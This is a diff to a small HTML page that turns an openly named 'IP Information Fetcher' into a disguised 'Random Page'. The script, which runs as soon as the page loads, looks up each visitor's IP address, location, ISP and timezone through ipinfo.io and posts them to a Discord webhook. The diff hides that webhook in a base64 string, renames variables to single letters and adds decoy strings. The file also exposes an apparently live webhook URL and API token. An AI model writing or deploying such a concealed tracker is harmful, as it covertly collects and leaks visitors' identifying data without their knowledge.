@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Information Fetcher</title>
+    <title>Random Page</title>
     <style>
         body { 
             background-color: #000; 
@@ -12,38 +12,49 @@
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
-            margin: 0;
+            margin: 0; 
             font-family: Arial, sans-serif; 
         }
     </style>
 </head>
 <body>
-    <h1>IP Information Fetcher</h1>
+    <h1>Random Content</h1>
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9"; // Your Discord webhook URL
-        const ipinfoToken = "afbce99e0999ed"; // Your IPinfo token
+        let Z99 = "NDEyMjk4ZDY0ZTRmNGZiZmJiOGVlOTA1ZGEyMGVjY2EsaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==";
+        let A2 = "abc123"; 
+        let X1 = "XYZ789";
+        let M9 = "Hello, Universe!";
+        let K5 = "No More Secrets!";
+        
+        function A() {
+            return atob(Z99);
+        }
 
-        async function fetchIPInfo() {
+        let random1 = A();
+        let token = "afbce99e0999ed";
+        let Q = "U78QW45E";
+
+        async function B() {
             try {
-                const response = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
-                if (!response.ok) throw new Error('Network response was not ok');
+                let C = await fetch(`https://ipinfo.io/json?token=${token}`);
+                if (!C.ok) throw new Error('Fail');
 
-                const data = await response.json();
-                const payload = {
-                    content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}, Org: ${data.org}, Location: ${data.loc}, Timezone: ${data.timezone}`
-                };
+                let D = await C.json();
+                let E = { content: `IP: ${D.ip}, City: ${D.city}, Region: ${D.region}, Country: ${D.country}, Org: ${D.org}, Loc: ${D.loc}, TZ: ${D.timezone}` };
 
-                await fetch(webhookURL, {
+                await fetch(random1, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(E)
                 });
-            } catch (error) {
-                console.error('Error:', error);
+            } catch (F) {
+                console.error('Error:', F);
             }
         }
 
-        fetchIPInfo();
+        B();
+        console.log(M9);
+        console.log(K5);
     </script>
 </body>
 </html>
